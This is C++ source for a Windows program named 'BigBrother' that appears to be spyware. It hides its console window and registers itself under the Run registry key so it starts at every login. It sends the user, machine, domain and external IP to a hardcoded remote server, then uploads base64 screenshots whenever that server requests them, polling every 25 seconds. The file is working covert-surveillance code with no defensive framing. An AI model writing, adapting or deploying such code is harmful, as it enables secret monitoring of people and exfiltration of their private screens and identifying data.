#include "inc/hostinfo.h"
#include "inc/screenshot.h"

#include <string>
#include <nlohmann/json.hpp>
#include <iostream>
#include <atltime.h>



using namespace std;


//hide console
#pragma comment(linker, "/subsystem:windows /ENTRY:mainCRTStartup")

const string _host = "https://razrabotka-sajtov-v-moskve.ru";
const int _interval = 25; // seconds



#define STRLEN(x) (sizeof(x)/sizeof(TCHAR) - 1)

BOOL SetAutorun() {
    HKEY hKey = NULL;
    LONG lResult = 0;
    TCHAR szExeName[MAX_PATH + 1];

    BOOL result = FALSE;

    GetModuleFileName(NULL, szExeName, STRLEN(szExeName));

    lResult = RegOpenKey(
        HKEY_CURRENT_USER,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        &hKey);

    if (ERROR_SUCCESS != lResult) {
        return FALSE;
    }

    if (RegSetValueEx(hKey, L"BigBrother", 0, REG_SZ, (PBYTE)szExeName,
        lstrlen(szExeName) * sizeof(TCHAR) + 1) != ERROR_SUCCESS) {
        result = TRUE;
    }
    RegCloseKey(hKey);

    return result;
}

string GetCurrentDateTime() {
    time_t rawtime;

    rawtime = time(NULL);

    tm timeinfo;
    errno_t result = localtime_s(&timeinfo, &rawtime);

    string dateTime = to_string(1900 + timeinfo.tm_year) +
        "-" + to_string(1 + timeinfo.tm_mon) +
        "-" + to_string(timeinfo.tm_mday) +
        " " + to_string(timeinfo.tm_hour) +
        ":" + to_string(timeinfo.tm_min) +
        ":" + to_string(timeinfo.tm_sec);

    return dateTime;
}

int StartSession() {
    string url = _host + "/api/session/create/";
    string userName = GetUser();
    string computerName = GetMachine();
    string domainName = GetDomain();
    string IPv4 = GetExternalIP();
    string dateTime = GetCurrentDateTime();

    //cout << "userName=" << userName << "\n";
    //cout << "computerName=" << computerName << "\n";
    //cout << "IPv4=" << IPv4 << " external\n";
    //cout << dateTime << "\n";


    string fields = "{\"domain\": \"" + domainName
        + "\", \"machine\": \"" + computerName
        + "\", \"ip\": \"" + IPv4
        + "\", \"user\": \"" + userName
        + "\", \"start_activity\": \"" + dateTime
        + "\", \"last_activity\": \"" + dateTime + "\"}";

    string response = SendRequest(url, fields, "POST");

    if (response != "error") {
        nlohmann::json j = nlohmann::json::parse(response);
        if (j.contains("id")) {
            return j.at("id");
        }
    }

    return 0;
}

int SendScreenshot(int sessionId) {
    string url = _host + "/api/screenshot/create/";
    string base64 = GetScreenshot();
    string created = GetCurrentDateTime();

    string fields = "{\"session\": \"" + to_string(sessionId) 
        + "\", \"created\": \"" + created 
        + "\", \"screenshot\": \"" + base64 + "\"}";

    string response = SendRequest(url, fields, "POST");

    if (response != "error") {
        nlohmann::json j = nlohmann::json::parse(response);
        if (j.contains("id")) {
            return j.at("id");
        }
    }

    return 0;
}

int SendSessionAlive(int sessionId) {
    string url = _host + "/api/session/update/" + to_string(sessionId) + "/";
    string dateTime = GetCurrentDateTime();

    string fields = "{\"last_activity\": \"" + dateTime
        + "\", \"get_screenshots\": \"false\"}";

    string response = SendRequest(url, fields, "PUT");

    if (response != "error") {
        nlohmann::json j = nlohmann::json::parse(response);
        if (j.contains("id")) {
            return j.at("id");
        }
    }
    return 0;
}

bool CheckNeedScreenshot(int sessionId) {
    string url = _host + "/api/session/get/" + to_string(sessionId) + "/";

    string response = SendRequest(url);

    if (response != "error") {
        nlohmann::json j = nlohmann::json::parse(response);
        if (j.contains("get_screenshots")) {
            //cout << j.at("get_screenshots") << "\n";
            return j.at("get_screenshots");
        }
    }

    return FALSE;
}

int main() {
    //::ShowWindow(::GetConsoleWindow(), SW_HIDE);

    SetAutorun();

    int id = StartSession();

    //int id = 137;

    cout << "session_id=" << id << "\n";

    SendScreenshot(id);

    while (true) {
        if (CheckNeedScreenshot(id)) {
            SendScreenshot(id);
        }
        SendSessionAlive(id);
        Sleep(_interval * 1000);
    }

	return 0;
}

